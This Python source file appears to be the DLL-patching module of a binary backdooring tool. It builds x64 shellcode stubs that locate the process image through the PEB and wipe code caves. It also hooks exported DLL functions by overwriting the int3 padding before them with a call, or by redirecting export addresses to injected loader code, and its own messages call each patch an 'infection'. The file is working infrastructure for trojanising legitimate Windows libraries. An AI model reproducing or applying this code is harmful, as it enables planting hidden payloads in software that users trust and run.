from capstone import *
import struct
import random
import logging
import os
import io
logger = logging.getLogger(__name__)


class dll_core:

    def __init__(self, BDF=None):
        self.BDF = BDF    
        logger.debug("In file {0}".format(str(os.path.abspath(__file__))))
        self.name = "dll_core"
        self.description = """Supports DLL patching"""
        self.requirements = {}

    def clean_caves_stub(self, CavesToFix):
        stub = bytes("\x48\x31\xC0"                          # xor rax,rax
                "\x48\x31\xC9"                          # xor rcx,rcx
                "\x65\x48\x8B\x49\x60"                  # mov rcx,QWORD PTR gs:[rcx+0x60]
                "\x48\x8B\x49\x10"                      # mov rcx,QWORD PTR [rcx+0x10]
                "\x48\x89\xCB"                          # mov rbx,rcx
                , 'iso-8859-1')
        for cave, values in CavesToFix.items():
            stub += b"\x48\xbf"                          # mov rdi, value below
            stub += struct.pack("<Q", values[0])
            stub += b"\x48\x01\xDF"                      # add rdi, rbx
            stub += b"\x48\xb9"                          # mov rcx, value below
            stub += struct.pack("<Q", values[1])
            stub += b"\xf3\xaa"                          # REP STOS BYTE PTR ES:[EDI]
        return stub

    def update_export_apis(self):
        # Find Export APIS
        # This will need to be done more intelligently
        found_export = False
        if self.BDF.options['EXPORTS'].lower() == 'all':
            # clear the string
            self.BDF.options['EXPORTS'] = ''
            for count, name_export in enumerate(self.BDF.pe_object['ExportNames'], 0):
                #print(name_export)
                # No DLLMain
                if b'dllmain' in name_export[2].lower():
                    continue
                #print(name_export[2].lower())
                if name_export[2] == b'':
                    continue
                try:
                    name_export[2].decode('utf-8')
                except Exception as e:
                    continue
                self.BDF.options['EXPORTS'] += name_export[2].decode('utf-8') + ','

        self.BDF.pe_object['Update_Export_First_API'] = False
        for targetExport in self.BDF.options['EXPORTS'].split(','):
            print("="* 50)
            for count, name_export in enumerate(self.BDF.pe_object['ExportNames'], 0):
                if targetExport.encode('utf-8') in name_export: 
                    logger.debug(f'Ordinal: {count+1}')
                    logger.info(f'Found Export: {count}+1, {name_export}')
                    logger.info(f"Export Info: {self.BDF.pe_object['ExportAddressTable'][count][0]}")

                    if self.BDF.pe_object['ExportAddressTable'][count][0][3] is True:
                        # it's a forwarder and we don't patch it as there is no function here.
                        found_export = False
                    else:
                        found_export = True

                    # check 5 bytes before the export to see if \xcc
                    self.BDF.pe_object['loaded_binary'].seek(self.BDF.pe_object['ExportAddressTable'][count][0][2] - 5, 0)

                    if self.BDF.pe_object['loaded_binary'].read(5) == b'\xcc\xcc\xcc\xcc\xcc':
                        logger.debug('This function has enough space before it to hook.')
                        logger.info("Hooking this function")
                        prefunction_ccs = True
                        # need to add the offset to the prefix
                        api_call_replacement = self.BDF.pe_object['text_loader_location'] - self.BDF.pe_object['ExportAddressTable'][count][0][2] + self.BDF.pe_object['normal_loader_start_loc'] # offset prefix
                        # change it to point to self.BDF.pe_object['txt_vrt_slck_loc']

                        self.BDF.patch_instr[self.BDF.pe_object['ExportAddressTable'][count][0][2] - 5] = b"\xe8" + struct.pack("<I", api_call_replacement)

                        # change the export to point five lines before
                        self.BDF.patch_instr[self.BDF.pe_object['ExportAddressTable'][count][0][1]] = struct.pack("<I", self.BDF.pe_object['ExportAddressTable'][count][0][0] - 5)
                    elif self.BDF.pe_object['Update_Export_First_API'] is False:
                        logger.info('Not enough breakpoints before this function call, patching this one')
                        self.BDF.pe_object['Update_Export_First_API'] = True
                        # This will point to  the text loader location

                        self.BDF.pe_object['ExportAPI_at_text'] = self.BDF.pe_object['ExportAddressTable'][count][0][0]

                        # change the export to point to the text loader

                        self.BDF.patch_instr[self.BDF.pe_object['ExportAddressTable'][count][0][1]] = struct.pack("<I", self.BDF.pe_object['txt_vrt_slck_loc'] - self.BDF.pe_object['ImageBase'])
                    else:
                        logger.info('Not enough breakpoints before this function call, can only do one of these per infection.')
                        continue

        if not found_export:
            logger.error(f"Your selected exports,{self.BDF.options['EXPORTS']}, were not Found")
            # print exports in the file
            print("Here's the APIs is in the DLL available for hooking:")

            forwardedExports = ''
            localExports = ''
            for count, name_export in enumerate(self.BDF.pe_object['ExportNames'], 0):
                #print(name_export)

                if b'dllmain' in name_export[2].lower():
                    continue
                if self.BDF.pe_object['ExportAddressTable'][count][0][3] is True:
                    # it's a forwarder and we don't patch it as there is no function here.
                    forwardedExports += name_export[2].decode('utf-8') + ','
                else:
                    localExports += name_export[2].decode('utf-8') + ','

            print(f'[*]Exports that can be used: {localExports}\n')
            print(f'[!]Exports that cannot be used as they are forwarded Exports: {forwardedExports}')

            return False

        return True

    def resume_execution_dll(self):

        resumeExe = b'\xc3'  # ret

        return resumeExe
